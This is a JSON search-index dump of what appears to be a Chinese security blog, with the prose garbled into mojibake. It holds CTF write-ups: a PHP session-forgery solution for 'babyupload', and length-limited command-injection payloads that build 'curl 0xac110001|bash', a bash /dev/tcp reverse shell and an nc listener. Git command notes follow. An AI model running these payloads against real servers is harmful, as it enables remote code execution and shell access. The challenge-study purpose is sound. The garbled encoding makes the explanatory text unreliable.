éƒ¨åˆ†å¤ç°","uri":"/posts/hfctf-web/"},{"categories":["CTF"],"content":"0x03 babyupload è¿™ä¸ªæ˜¯çœŸ PHP \u003c?php error_reporting(0); session_save_path(\"/var/babyctf/\"); session_start(); require_once \"/flag\"; highlight_file(__FILE__); if($_SESSION['username'] ==='admin') { $filename='/var/babyctf/success.txt'; if(file_exists($filename)){ safe_delete($filename); die($flag); } } else{ $_SESSION['username'] ='guest'; } $direction = filter_input(INPUT_POST, 'direction'); $attr = filter_input(INPUT_POST, 'attr'); $dir_path = \"/var/babyctf/\".$attr; if($attr===\"private\"){ $dir_path .= \"/\".$_SESSION['username']; } if($direction === \"upload\"){ try{ if(!is_uploaded_file($_FILES['up_file']['tmp_name'])){ throw new RuntimeException('invalid upload'); } $file_path = $dir_path.\"/\".$_FILES['up_file']['name']; $file_path .= \"_\".hash_file(\"sha256\",$_FILES['up_file']['tmp_name']); if(preg_match('/(\\.\\.\\/|\\.\\.\\\\\\\\)/', $file_path)){ throw new RuntimeException('invalid file path'); } @mkdir($dir_path, 0700, TRUE); if(move_uploaded_file($_FILES['up_file']['tmp_name'],$file_path)){ $upload_result = \"uploaded\"; }else{ throw new RuntimeException('error while saving'); } } catch (RuntimeException $e) { $upload_result = $e-\u003egetMessage(); } } elseif ($direction === \"download\") { try{ $filename = basename(filter_input(INPUT_POST, 'filename')); $file_path = $dir_path.\"/\".$filename; if(preg_match('/(\\.\\.\\/|\\.\\.\\\\\\\\)/', $file_path)){ throw new RuntimeException('invalid file path'); } if(!file_exists($file_path)) { throw new RuntimeException('file not exist'); } header('Content-Type: application/force-download'); header('Content-Length: '.filesize($file_path)); header('Content-Disposition: attachment; filename=\"'.substr($filename, 0, -65).'\"'); if(readfile($file_path)){ $download_result = \"downloaded\"; }else{ throw new RuntimeException('error while saving'); } } catch (RuntimeException $e) { $download_result = $e-\u003egetMessage(); } exit; } ?\u003e é‡ç‚¹åœ¨è¿™é‡Œ if($_SESSION['username'] ==='admin') { $filename='/var/babyctf/success.txt'; if(file_exists($filename)){ safe_delete($filename); die($flag); } } æˆ‘ä»¬éœ€è¦ä¼ªé€  session è®©è‡ªå·±å˜æˆ admin å¹¶ä¸”éœ€è¦åˆ›å»º success.txt æ–‡ä»¶ æˆ‘ä»¬å…ˆè¯»å–ä¸€ä¸‹ sessionï¼Œåä¸º sess_PHPSESSID çš„æ–‡ä»¶ è¯»å– SESSION æ–‡ä»¶get_sess \" è¯»å– SESSION æ–‡ä»¶ å…¶å†…å®¹å¦‚ä¸‹ SESSION æ–‡ä»¶çš„å†…å®¹sess \" SESSION æ–‡ä»¶çš„å†…å®¹ è¿™é‡Œè¦çŸ¥é“ PHP session åºåˆ—åŒ–çš„å½¢å¼ï¼ˆsession.serialize_handlerï¼‰ php é”®å + ç«–çº¿ + ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼ php_binary é”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦ + é”®å + ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼ php_serializeï¼ˆ php \u003e= 5.5.4 ï¼‰ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„æ•°ç»„ ç”±äºæœ€å‰è¾¹æœ‰ä¸€ä¸ªä¸å¯è§å­—ç¬¦ï¼Œå¯ä»¥åˆ¤æ–­è¿™é‡Œç”¨çš„æ˜¯ php_binary æˆ‘ä»¬å‘ç°æœ€åä¸Šä¼ çš„æ–‡ä»¶åæ˜¯åŸæ–‡ä»¶å + â€˜_â€™ + æ–‡ä»¶åçš„ SHA256 å€¼ï¼Œä¸ session æ–‡ä»¶çš„æ–‡ä»¶åä¼¼ä¹æœ‰ç‚¹ç›¸ä¼¼ æ„é€ ä¸€ä¸ª php_binary å½¢å¼çš„ session æ–‡ä»¶ï¼Œusername ä¸º adminï¼Œæ³¨æ„å›¾ä¸­çš„ä¸å¯è§å­—ç¬¦ 08ï¼ˆæˆ–è€…ç”¨ PHP ç›´æ¥ç”Ÿæˆä¹Ÿå¯ä»¥ ç”Ÿæˆæ¶æ„ SESSION æ–‡ä»¶sess_file \" ç”Ÿæˆæ¶æ„ SESSION æ–‡ä»¶ è®¡ç®—ä¸€ä¸‹è¯¥æ–‡ä»¶çš„ SHA256 å€¼ è®¡ç®— SESSION æ–‡ä»¶çš„ SHA256 å€¼sess_sha256 \" è®¡ç®— SESSION æ–‡ä»¶çš„ SHA256 å€¼ ä¸Šä¼ è¯¥ sess æ–‡ä»¶ ä¸Šä¼  SESSION æ–‡ä»¶upload \" ä¸Šä¼  SESSION æ–‡ä»¶ ç„¶åå°† PHPSESSID æ”¹ä¸ºä¸Šé¢è®¡ç®—çš„ SHA256 å€¼å³å¯ ä¸‹ä¸€æ­¥å°±æ˜¯æ€ä¹ˆåˆ›å»º success.txtï¼Œç›´æ¥ä¸Šä¼ çš„è¯æ–‡ä»¶ååä¼šåŒ…å« SHA256 å€¼ï¼Œä½†æ˜¯æ ¹æ® file_exists çš„å‡½æ•°æè¿°ï¼Œå®ƒæ˜¯æ£€æŸ¥æ–‡ä»¶æˆ–ç›®å½•æ˜¯å¦å­˜åœ¨ï¼Œæˆ‘ä»¬ä¸å¥½ç›´æ¥ä¸Šä¼ æ–‡ä»¶ï¼Œä½†æ˜¯å¯ä»¥åˆ›å»ºç›®å½• åˆ›å»º success.txt ç›®å½•success \" åˆ›å»º success.txt ç›®å½• åˆ·æ–°é¡µé¢å³å¯è·å¾— flag ","date":"2020-04-22","objectID":"/posts/hfctf-web/:4:0","tags":["WriteUp"],"title":"è™ç¬¦ CTF WEB éƒ¨åˆ†å¤ç°","uri":"/posts/hfctf-web/"},{"categories":["CTF"],"content":"0x04 å®Œç»“æ’’èŠ± ä¸€å…±ä¸‰é“ WEB æœ‰ä¸¤é“ nodejs ç€å®æ²¡æƒ³åˆ°ï¼Œå¯¹ nodejs ä¸€ç‚¹éƒ½ä¸ç†Ÿæ‚‰ï¼Œæ€»ç»“ä¸€ä¸‹ï¼Œè¿˜æ˜¯å¤ªèœäº† ä»¥åè¦å¤šçœ‹çœ‹è¿™ä¸€ç±»çš„é¢˜ï¼Œè¦ä¸ç„¶æ¯”èµ›é‡åˆ°äº†æ— ä»ä¸‹æ‰‹å°±å¾ˆéš¾å— ","date":"2020-04-22","objectID":"/posts/hfctf-web/:5:0","tags":["WriteUp"],"title":"è™ç¬¦ CTF WEB éƒ¨åˆ†å¤ç°","uri":"/posts/hfctf-web/"},{"categories":["WEB"],"content":"0x00 å‰è¨€ ä¹‹å‰åšé¢˜æœ‰åšåˆ°è¿‡å­—æ•°é™åˆ¶çš„ shellï¼Œæœ‰äº”ä¸ªå­—ç¬¦ä¹Ÿæœ‰å››ä¸ªå­—ç¬¦çš„ï¼Œå½“ç„¶æˆ‘ä¸€ç›´ä¸ä¼šåšï¼Œæœ€è¿‘åˆé‡æ–°ç ”ç©¶äº†ä¸€ä¸‹è¿™ä¸ªç»•è¿‡çš„é—®é¢˜ï¼Œå°±æŠŠå®ƒè®°å½•ä¸‹æ¥äº† è¿™ç§é¢˜ä¸€èˆ¬éƒ½æ˜¯æ¯äººä¸€ä¸ª sandbox ç›®å½•ï¼Œä¹‹åçš„æ“ä½œéƒ½åœ¨è¿™ä¸ªç›®å½•ä¸­è¿›è¡Œ ","date":"2020-04-18","objectID":"/posts/bypass-char-number-limit/:1:0","tags":["WEBå®‰å…¨","Linux"],"title":"ç»•è¿‡å­—ç¬¦æ•°é™åˆ¶ getshell","uri":"/posts/bypass-char-number-limit/"},{"categories":["WEB"],"content":"0x01 å‰ç½®çŸ¥è¯† ls è¾“å‡ºçš„é»˜è®¤æ’åºæ˜¯é€å­—ç¬¦æŒ‰ç…§ ASCII ç ä»å°åˆ°å¤§æ’åº ls -t æ–‡ä»¶åæŒ‰æ—¶é—´æ’åº é‡å®šå‘ç¬¦ \u003e æ— å‘½ä»¤ä¹Ÿå¯ç”¨äºåˆ›å»ºæ–‡ä»¶ IP çš„ç­‰ä»·è¡¨ç¤ºï¼ˆé€‰ç”¨ï¼Œæœ‰æ—¶å¯é™ä½éš¾åº¦ï¼‰ å°† . åˆ†éš”çš„æ¯ä¸ªåè¿›åˆ¶æ•°è½¬æ¢æˆä¸¤ä½åå…­è¿›åˆ¶å†è¿æ¥èµ·æ¥ï¼ˆå¯è½¬æ¢æˆåè¿›åˆ¶ã€å…«è¿›åˆ¶ç­‰ï¼‰ï¼Œå’ŒåŸ IP ç­‰ä»·ä½¿ç”¨ ip = '172.17.0.1' hex_ip = '0x' for i in ip.split('.'): hex_ip += str(hex(int(i)))[2:].zfill(2) print(hex_ip) # 0xac110001 print(int(hex_ip, 16)) # 2886795265 print('0' + oct(int(hex_ip, 16))[2:]) # 025404200001 å•ç‹¬çš„ * ç›¸å½“äº `ls` å³å°†æ–‡ä»¶åä½œä¸ºå‘½ä»¤æ‰§è¡Œï¼Œä¹Ÿå¯ä»¥æ·»åŠ å…¶å®ƒå­—ç¬¦è¿›è¡ŒåŒ¹é… å•ç‹¬çš„ * ç›¸å½“äº `ls`star \" å•ç‹¬çš„ * ç›¸å½“äº `ls` å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œç›®å½•ä¸‹æœ‰ä¸¤ä¸ªæ–‡ä»¶ dir å’Œ whoami ï¼Œå•ç‹¬çš„ * æ‰§è¡Œäº† dir whoami å‘½ä»¤ï¼Œè€Œ *i æ‰§è¡Œäº† whoami å‘½ä»¤ dir å‘½ä»¤æœ¬è´¨ä¸Šä¸ ls ç›¸åŒï¼Œä½†è¾“å‡ºä¸æ¢è¡Œï¼Œä¸”é¦–å­—æ¯ä¸º d å¯ä»¥æ“ä½œ rev å‘½ä»¤è¾“å‡ºåè½¬æ–‡ä»¶æ¯ä¸€è¡Œåçš„å†…å®¹ rev å‘½ä»¤åè½¬æ¯ä¸€è¡Œçš„å†…å®¹rev \" rev å‘½ä»¤åè½¬æ¯ä¸€è¡Œçš„å†…å®¹ ","date":"2020-04-18","objectID":"/posts/bypass-char-number-limit/:2:0","tags":["WEBå®‰å…¨","Linux"],"title":"ç»•è¿‡å­—ç¬¦æ•°é™åˆ¶ getshell","uri":"/posts/bypass-char-number-limit/"},{"categories":["WEB"],"content":"0x02 5ä¸ªå­—ç¬¦ å½“ç„¶å…ˆæ˜¯äº”ä¸ªå­—ç¬¦çš„ï¼Œç®€å•ä¸€ç‚¹ é¢˜ç›®ä»£ç å¦‚ä¸‹ï¼š \u003c?php $sandbox = '/tmp/sandbox5/'.md5($_SERVER['REMOTE_ADDR']); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET['cmd']) \u0026\u0026 strlen($_GET['cmd']) \u003c= 5) { @exec($_GET['cmd']); } else if (isset($_GET['reset'])) { @exec('/bin/rm -rf '.$sandbox.'/*'); } highlight_file(__FILE__); å¤§ä½“æ€è·¯å°±æ˜¯æŠŠ curl ip|bash åˆ†å‰²æˆä¸€ä¸ªä¸€ä¸ªå°å­—ç¬¦ä¸²ï¼Œå¹¶åœ¨ç»“å°¾æ·»åŠ  \\ è¿æ¥ï¼Œå°†è¦æ‰§è¡Œçš„è„šæœ¬æ”¾åœ¨æœåŠ¡å™¨ä¸Šï¼Œè¿™å…¶ä¸­è¿˜è¦ç”¨åˆ° ls -t ï¼Œä¸ºäº†é˜²æ­¢ . çš„å¹²æ‰°é‡‡ç”¨åå…­è¿›åˆ¶è¡¨ç¤º IP (è¿™é‡Œéœ€è¦è‡ªå·±ç ”ç©¶æ€ä¹ˆåˆ†å‰²) # ls -t\u003ev \u003els\\\\ ls\u003e_ \u003e\\ \\\\ \u003e-t\\\\ \u003e\\\u003ev ls\u003e\u003e_ # curl 0xac110001|bash (é€‚å½“åˆ†å‰²å¹¶é€†åºå†™å…¥) \u003ebash \u003e\\|\\\\ \u003e01\\\\ \u003e00\\\\ \u003e11\\\\ \u003eac\\\\ \u003e0x\\\\ \u003e\\ \\\\ \u003erl\\\\ \u003ecu\\\\ # exec sh _ sh v æœåŠ¡å™¨ä¸­ index.html ä¸­æ”¾æœ‰åå¼¹ shell çš„å‘½ä»¤ bash -i \u003e\u0026 /dev/tcp/172.17.0.1/12345 0\u003e\u00261 åœ¨æœåŠ¡å™¨ç›‘å¬ 12345 ç«¯å£ nc -lvp 12345 æˆåŠŸåå¼¹ shell ","date":"2020-04-18","objectID":"/posts/bypass-char-number-limit/:3:0","tags":["WEBå®‰å…¨","Linux"],"title":"ç»•è¿‡å­—ç¬¦æ•°é™åˆ¶ getshell","uri":"/posts/bypass-char-number-limit/"},{"categories":["WEB"],"content":"0x02.5 ä¸€ä¸ªæƒŠå–œçš„å‘ç° æˆ‘åœ¨åš 4 ä¸ªå­—ç¬¦çš„æµ‹è¯•æ—¶å‘ç°ï¼Œç”¨ php çš„ exec å‡½æ•°æ‰§è¡Œ shell å‘½ä»¤ï¼Œç»“å°¾çš„åæ–œæ å±…ç„¶ä¸éœ€è¦è½¬ä¹‰ å³ä¸Šä¸€é¢˜çš„ payload å¯ç®€åŒ–ä¸º # ls -t\u003ev \u003els\\ ls\u003e_ \u003e\\ \\ \u003e-t\\ \u003e\\\u003ev ls\u003e\u003e_ # curl 0xac110001|bash (é€‚å½“åˆ†å‰²å¹¶é€†åºå†™å…¥) \u003ebash \u003e1\\|\\ \u003e000\\ \u003ec11\\ \u003e0xa\\ \u003el\\ \\ \u003ecur\\ # exec sh _ sh v ä¹ŸæˆåŠŸåå¼¹äº† shellï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯ä¸ªä¾‹æˆ–è€…æ˜¯ php ç‰ˆæœ¬é—®é¢˜ï¼Œä½†æˆ‘åœ¨æ¥ä¸‹æ¥ 4 ä¸ªå­—ç¬¦çš„æ“ä½œä¸­ä½¿ç”¨åˆ°äº†è¿™ä¸ªç‰¹æ€§ï¼Œè¦æ˜¯æœ‰ dalao å‘ç°è¿™æ ·ä¸å¯è¡Œçƒ¦è¯·å‘ŠçŸ¥æˆ‘ï¼ˆå¦‚æœçœŸçš„æœ‰ dalao çœ‹çš„è¯ ","date":"2020-04-18","objectID":"/posts/bypass-char-number-limit/:4:0","tags":["WEBå®‰å…¨","Linux"],"title":"ç»•è¿‡å­—ç¬¦æ•°é™åˆ¶ getshell","uri":"/posts/bypass-char-number-limit/"},{"categories":["WEB"],"content":"0x03 4ä¸ªå­—ç¬¦ è¿™æ‰æ˜¯é‡å¤´æˆï¼Œæ›¾ç»å·®ç‚¹æŠŠæˆ‘æè‡ªé—­çš„é¢˜ï¼Œæˆ‘ç»ˆäºåšå‡ºæ¥äº† é¢˜ç›®ä»£ç å¦‚ä¸‹ï¼š \u003c?php $sandbox = '/tmp/sandbox4/'.md5($_SERVER['REMOTE_ADDR']); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET['cmd']) \u0026\u0026 strlen($_GET['cmd']) \u003c= 4) { @exec($_GET['cmd']); } else if (isset($_GET['reset'])) { @exec('/bin/rm -rf '.$sandbox.'/*'); } highlight_file(__FILE__); æ€è·¯ä¸ä¹‹å‰ç›¸åŒï¼Œä½†æ˜¯è¦å……åˆ†è¿ç”¨ dir å’Œ rev å‘½ä»¤ï¼Œå…ˆæ”¾ä¸€ä¸‹ payload å†è¿›è¡Œåˆ†æ # ls -tk\u003ef \u003edir \u003ef\\\u003e \u003ekt- \u003esl *\u003ev # è¿™é‡Œæ–‡ä»¶åä¸º v éå¸¸é‡è¦ \u003erev *v\u003eg # curl 0xac110001|bash (é€‚å½“åˆ†å‰²å¹¶é€†åºå†™å…¥) \u003eash \u003eb\\ \u003e\\|\\ \u003e01\\ \u003e00\\ \u003e11\\ \u003eac\\ \u003e0x\\ \u003e\\ \\ \u003erl\\ \u003ecu\\ # exec sh g sh f è¿™é‡Œé‡ç‚¹åˆ†æç¬¬ä¸€éƒ¨åˆ†ï¼Œæ€ä¹ˆå¥‡ç‰¹çš„æ„é€ å‡ºéœ€è¦çš„å‘½ä»¤ ç¬¬ä¸€æ­¥åˆ›å»ºåä¸º dir çš„æ–‡ä»¶ï¼Œç”±äº d çš„ ASCII ç è¾ƒå°ï¼Œè¿™ä¸ªæ–‡ä»¶åœ¨ç¬¬ä¸€éƒ¨åˆ†å°†å§‹ç»ˆä½äºç¬¬ä¸€ä½ ç¬¬äºŒä¸‰å››æ­¥åˆ†åˆ«åˆ›å»ºå¯¹åº”æ–‡ä»¶ ç¬¬äº”æ­¥ç”¨åˆ°äº†å•ç‹¬çš„ * è¿™é‡Œç›¸å½“äºæ‰§è¡Œäº† `dir f\u003e kt- sl`\u003ev è¿™ä¹‹åæ–‡ä»¶ v ä¸­çš„å†…å®¹ä¸º f\u003e kt- sl ç¬¬å…­æ­¥åˆ›å»ºåä¸º rev çš„æ–‡ä»¶ ç¬¬ä¸ƒæ­¥æ˜¯è¿™é‡Œæœ€é‡è¦çš„åœ°æ–¹ï¼Œä¹Ÿæ˜¯å‰è¾¹çš„æ–‡ä»¶åä¸º v éå¸¸é‡è¦çš„åŸå› ï¼Œç”¨åˆ°äº† * ç¬¬äºŒç§ç”¨æ³•ï¼Œç›¸å½“äºæ‰§è¡Œäº† `rev v`\u003eg ï¼Œå³å°† v çš„å†…å®¹åè½¬å†™å…¥ g è¿™ä¹‹åæ–‡ä»¶ g çš„å†…å®¹ä¸º ls -kt \u003ef ä¹‹åçš„å†…å®¹ä¸ 5 ä¸ªå­—ç¬¦çš„æ–¹æ³•ç›¸åŒ è¿™é‡Œå†è§£é‡Šä¸¤ä¸ªåœ°æ–¹ æ˜¯æ–‡ä»¶å f å¯ä»¥ä¿®æ”¹ï¼Œä½†è¦ä¿è¯å…¶ä½äºç¬¬äºŒä½ æ˜¯ -tk ä¸­çš„ k å¯¹è¾“å‡ºç»“æœæ²¡æœ‰å½±å“ï¼Œä½†æ§åˆ¶äº†è¯¥æ–‡ä»¶åœ¨è¾“å‡ºä¸­çš„ä½ç½®ï¼Œä¹Ÿå¯è¿›è¡Œä¿®æ”¹ï¼Œä½†è¦ä»æ»¡è¶³ä»¥ä¸Šä¸¤ç‚¹æ‰å¯ä»¥ ","date":"2020-04-18","objectID":"/posts/bypass-char-number-limit/:5:0","tags":["WEBå®‰å…¨","Linux"],"title":"ç»•è¿‡å­—ç¬¦æ•°é™åˆ¶ getshell","uri":"/posts/bypass-char-number-limit/"},{"categories":["WEB"],"content":"0x04 åè®° å¥½ä¹…æ²¡å†™åšå®¢äº†ï¼Œåœ¨ npy çš„æé†’ä¸‹æ¥æ°´ä¸€ç¯‡åšå®¢ï¼Œä¹Ÿå½“åšä¸€ä¸ªç¬”è®°ï¼Œä¸‹æ¬¡é‡åˆ°è¿™ç§é¢˜æŸ¥è‡ªå·±åšå®¢å°±å¥½äº† è¿™ä¸¤é“é¢˜çš„æºç æˆ‘æ”¾åˆ° GitHub äº†ï¼Œå¹¶æ·»åŠ äº†ä¸€ä¸ªæ–‡ä»¶åä¸º shell.php çš„ webshellï¼Œæ–¹ä¾¿ä»¥ www-data ç”¨æˆ·è¿›è¡Œä¸€äº›æ“ä½œï¼ˆå¥½åƒä¹Ÿæ²¡å¤šå¤§ç”¨ ","date":"2020-04-18","objectID":"/posts/bypass-char-number-limit/:6:0","tags":["WEBå®‰å…¨","Linux"],"title":"ç»•è¿‡å­—ç¬¦æ•°é™åˆ¶ getshell","uri":"/posts/bypass-char-number-limit/"},{"categories":["å¿ƒè·¯å†ç¨‹"],"content":"ã€‡ã€è·å–æœ¬åœ°ä»“åº“ git init åˆå§‹åŒ–ä»“åº“ git clone \u003curl\u003e ä»è¿œç¨‹ä»“åº“å…‹éš†ï¼ˆurl å¯é‡‡ç”¨ gitã€httpã€https å’Œ ssh ç­‰åè®®ï¼‰ ","date":"2020-02-19","objectID":"/posts/learn-git/:1:0","tags":["Git","å­¦ä¹ "],"title":"Git å­¦ä¹ ç¬”è®°","uri":"/posts/learn-git/"},{"categories":["å¿ƒè·¯å†ç¨‹"],"content":"ä¸€ã€æœ¬åœ°æ–‡ä»¶ä¿®æ”¹ã€æäº¤åŠæŸ¥çœ‹ç­‰ git status æŸ¥çœ‹å·²è·Ÿè¸ªæ–‡ä»¶çŠ¶æ€ï¼ˆä¿®æ”¹ã€æ–°åŠ ã€æ”¹åã€åˆ é™¤ç­‰ï¼‰ git add \u003cfile\u003e è¿½è¸ªæ–°æ–‡ä»¶ .gitignore æ–‡ä»¶ä¸­æ·»åŠ è¢«å¿½ç•¥çš„æ–‡ä»¶ ä»¥ # å¼€å¤´çš„å†…å®¹ä¸ºæ³¨é‡Šï¼Œè¢« Git è‡ªåŠ¨å¿½ç•¥ å¯ä½¿ç”¨ Glob è¡¨è¾¾å¼è¿›è¡Œæ¨¡å¼åŒ¹é… æ¨¡å¼æœ€åè·Ÿæ–œæ ï¼ˆ / ï¼‰è¡¨ç¤ºç›®å½• æ¨¡å¼å‰åŠ å¹å·ï¼ˆ ! ï¼‰ è¡¨ç¤ºå–å git diff å½“å‰æ–‡ä»¶ä¸æš‚å­˜åŒºä¹‹é—´çš„å·®å¼‚ --cached / --staged æš‚å­˜åŒºä¸ä¸Šæ¬¡æäº¤ä¹‹é—´çš„å·®å¼‚ git commit æäº¤æ›´æ”¹ -m æ·»åŠ æœ¬æ¬¡æäº¤çš„è¯´æ˜ï¼ˆè‹¥æ— è¯¥å‚æ•°å°†æ‰“å¼€æ–‡æœ¬ç¼–è¾‘å™¨è¿›è¡Œæ·»åŠ ï¼‰ -a æäº¤æ‰€æœ‰å·²æš‚å­˜çš„æ–‡ä»¶ï¼ˆè·³è¿‡ git add è¿‡ç¨‹ï¼‰ --amend æ’¤é”€æœ€åçš„æäº¤å¹¶é‡æ–°æäº¤ git rm ä» ä»“åº“ï¼ˆæš‚å­˜åŒºï¼‰å’Œ å·¥ä½œç›®å½• ä¸­åˆ é™¤ -f å¼ºåˆ¶åˆ é™¤ï¼ˆå·²ä¿®æ”¹å¹¶æ”¾å…¥æš‚å­˜åŒºçš„æ–‡ä»¶ï¼‰ --cached åªä»ä»“åº“ï¼ˆæš‚å­˜åŒºï¼‰ä¸­åˆ é™¤ï¼Œä¿ç•™åœ¨å·¥ä½œç›®å½•ä¸­ git mv ç§»åŠ¨æ–‡ä»¶ï¼ˆgit mv oldfile newfile ç›¸å½“äºè¿è¡Œä»¥ä¸‹ä¸‰æ¡å‘½ä»¤ï¼‰ mv oldfile newfile git rm oldfile gie add newfile git log æŸ¥çœ‹æäº¤å†å² -p æ˜¾ç¤ºæ¯æ¬¡æäº¤çš„å†…å®¹å·®å¼‚ -\u003cX\u003e (X ä¸ºæ•°å­—) åªæ˜¾ç¤ºæœ€è¿‘ X æ¬¡æäº¤ --stat ä»…æ˜¾ç¤ºç®€è¦çš„å¢æ”¹è¡Œæ•°ç»Ÿè®¡ --pretty= æŒ‡å®šæ˜¾ç¤ºçš„æ ¼å¼ oneline short full fuller è°ƒæ•´å±•ç¤ºä¿¡æ¯çš„å¤šå°‘ format:\"\" è‡ªå®šä¹‰è¦æ˜¾ç¤ºçš„æ ¼å¼ï¼ˆå¯ä½¿ç”¨å¦‚ä¸‹å ä½ç¬¦ï¼‰ %H æäº¤å¯¹è±¡ï¼ˆcommitï¼‰çš„å®Œæ•´å“ˆå¸Œå­—ä¸² %h æäº¤å¯¹è±¡çš„ç®€çŸ­å“ˆå¸Œå­—ä¸² %T æ ‘å¯¹è±¡ï¼ˆtreeï¼‰çš„å®Œæ•´å“ˆå¸Œå­—ä¸² %t æ ‘å¯¹è±¡çš„ç®€çŸ­å“ˆå¸Œå­—ä¸² %P çˆ¶å¯¹è±¡ï¼ˆparentï¼‰çš„å®Œæ•´å“ˆå¸Œå­—ä¸² %p çˆ¶å¯¹è±¡çš„ç®€çŸ­å“ˆå¸Œå­—ä¸² %an ä½œè€…ï¼ˆauthorï¼‰çš„åå­— %ae ä½œè€…çš„ç”µå­é‚®ä»¶åœ°å€ %ad ä½œè€…ä¿®è®¢æ—¥æœŸï¼ˆå¯ä»¥ç”¨ -date= é€‰é¡¹å®šåˆ¶æ ¼å¼ï¼‰ %ar ä½œè€…ä¿®è®¢æ—¥æœŸï¼ŒæŒ‰å¤šä¹…ä»¥å‰çš„æ–¹å¼æ˜¾ç¤º %cn æäº¤è€…(committer)çš„åå­— %ce æäº¤è€…çš„ç”µå­é‚®ä»¶åœ°å€ %cd æäº¤æ—¥æœŸ %cr æäº¤æ—¥æœŸï¼ŒæŒ‰å¤šä¹…ä»¥å‰çš„æ–¹å¼æ˜¾ç¤º %s æäº¤è¯´æ˜ --graph ç”¨å›¾å½¢è¡¨ç¤ºæ‰€åœ¨åˆ†æ”¯åŠåˆå¹¶å†å² --relative-date ä½¿ç”¨ç›¸å¯¹æ—¶é—´è¡¨ç¤º --name-only ä»…æ˜¾ç¤ºæ–°å¢ã€ä¿®æ”¹ã€åˆ é™¤çš„æ–‡ä»¶çš„æ–‡ä»¶å --name-status æ˜¾ç¤ºæ–°å¢ã€ä¿®æ”¹ã€åˆ é™¤çš„æ–‡ä»¶çš„æ–‡ä»¶åå’Œæ‰§è¡Œçš„æ“ä½œï¼ˆA D Mï¼‰ --abbrev-commit ä»…æ˜¾ç¤º SHA-1 çš„å‰å‡ ä¸ªå­—ç¬¦ --shortstat ä»…æ˜¾ç¤ºæ€»çš„è¡Œæ•°ä¿®æ”¹ç»Ÿè®¡ï¼ˆä¸æ˜¾ç¤ºå•æ–‡ä»¶çš„å˜åŒ–ï¼‰ --since= --after= ä»…æ˜¾ç¤ºæŒ‡å®šæ—¶é—´åçš„æäº¤ --until= --before= ä»…æ˜¾ç¤ºæŒ‡å®šæ—¶é—´ä¹‹å‰çš„æäº¤ --author= ä»…æ˜¾ç¤ºæŒ‡å®šä½œè€…çš„æäº¤ --committer= ä»…æ˜¾ç¤ºæŒ‡å®šæäº¤è€…çš„æäº¤ --no-merges æ’é™¤æ¥è‡ªåˆå¹¶çš„æäº¤ --merges åªæ˜¾ç¤ºæ¥è‡ªåˆå¹¶çš„æäº¤ --grep= åŒ¹é…æäº¤ä¿¡æ¯ä¸­çš„å…³é”®å­— æœ€åå•ç‹¬çš„ -- åçš„æ‰€æœ‰å†…å®¹ä¸ºé™å®šçš„è·¯å¾„æˆ–æ–‡ä»¶å git reset HEAD \u003cfile\u003e å–æ¶ˆå¯¹æ–‡ä»¶çš„æš‚å­˜ git checkout -- \u003cfile\u003e å–æ¶ˆå¯¹æ–‡ä»¶çš„ä¿®æ”¹ï¼ˆä»…é™äºä¿®æ”¹åæœªæš‚å­˜çš„æ–‡ä»¶ï¼‰ ","date":"2020-02-19","objectID":"/posts/learn-git/:2:0","tags":["Git","å­¦ä¹ "],"title":"Git å­¦ä¹ ç¬”è®°","uri":"/posts/learn-git/"},{"categories":["å¿ƒè·¯å†ç¨‹"],"content":"äºŒã€æœ¬åœ°ä¸è¿œç¨‹ä»“åº“ä¹‹é—´çš„æ“ä½œ git remote åˆ—å‡ºæ‰€æœ‰è¿œç¨‹åº“çš„åå­— -v --verbose æ˜¾ç¤ºå¯¹åº”çš„åœ°å€ add \u003cshortname\u003e \u003curl\u003e æ·»åŠ æ–°çš„è¿œç¨‹ä»“åº“ show \u003cremote-name\u003e æŸ¥çœ‹æŸä¸ªè¿œç¨‹ä»“åº“çš„è¯¦ç»†ä¿¡æ¯ rename \u003cold-name\u003e \u003cnew-name\u003e ä¿®æ”¹è¿œç¨‹ä»“åº“åœ¨æœ¬åœ°çš„ç®€ç§° rm \u003cremote-name\u003e ç§»é™¤æŸä¸ªè¿œç¨‹ä»“åº“ git fetch \u003cremote-name\u003e æ‹‰å–è¿œç¨‹ä»“åº“æœ‰ä½†æœ¬åœ°æ²¡æœ‰çš„æ•°æ®ï¼ˆä¸åˆå¹¶ï¼‰ git pull æ‹‰å–è·Ÿè¸ªçš„è¿œç¨‹ä»“åº“å¯¹åº”åˆ†æ”¯çš„æ•°æ®å¹¶åˆå¹¶ git push \u003cremote-name\u003e \u003cbranch-name\u003e å°†æœ¬åœ°çš„æŸåˆ†æ”¯æ¨é€åˆ°è¿œç¨‹ä»“åº“ï¼ˆé»˜è®¤ä¸º origin masterï¼‰ ","date":"2020-02-19","objectID":"/posts/learn-git/:3:0","tags":["Git","å­¦ä¹ "],"title":"Git å­¦ä¹ ç¬”è®°","uri":"/posts/learn-git/"},{"categories":["å¿ƒè·¯å†ç¨‹"],"content":"ä¸‰ã€æ ‡ç­¾æœ‰å…³æ“ä½œ git tag åˆ—å‡ºç°æœ‰æ ‡ç­¾ -l '' æ¨¡å¼æœç´¢ç¬¦åˆæ¡ä»¶çš„æ ‡ç­¾ -a \u003ctag-name\u003e [SHA-1] æ·»åŠ ï¼ˆè¡¥åŠ ï¼‰å«é™„æ³¨çš„æ ‡ç­¾ -s \u003ctag-name\u003e åŒä¸Šæ·»åŠ æ ‡ç­¾å¹¶ç”¨ GPG ç­¾ç½²æ ‡ç­¾ -m æ ‡ç­¾çš„é™„æ³¨è¯´æ˜ \u003ctag-name\u003e æ·»åŠ è½»é‡çº§æ ‡ç­¾ï¼ˆæ— éœ€é™„æ³¨ï¼‰ -v \u003ctag-name\u003e éªŒè¯å·²ç­¾ç½²çš„æ ‡ç­¾ git show \u003ctag-name\u003e æŸ¥çœ‹ç›¸åº”æ ‡ç­¾çš„ç‰ˆæœ¬ä¿¡æ¯ git push \u003cremote-name\u003e \u003ctag-name\u003e å°†æœ¬åœ°çš„æŸæ ‡ç­¾æ¨é€åˆ°è¿œç¨‹ä»“åº“ --tags æ¨é€æ‰€æœ‰æœ¬åœ°æ–°å¢çš„æ ‡ç­¾ 